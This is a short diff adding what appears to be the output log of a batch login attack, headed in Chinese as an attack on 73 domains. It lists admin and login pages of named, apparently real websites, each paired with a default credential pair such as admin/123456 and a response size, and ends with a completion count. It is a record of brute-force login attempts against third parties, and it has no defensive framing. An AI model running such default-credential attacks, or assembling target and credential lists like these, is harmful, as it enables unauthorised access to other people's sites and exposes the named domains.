@@ -1,0 +1,5 @@
+=== 73域名批量攻击 ===
+>>> chinawanri.com/admin admin/123456 -> 7351B
+>>> dgchzy.com/login admin/admin -> 28694B
+>>> www.chinawanri.com/admin admin/www123 -> 7352B
+DONE: 33/3
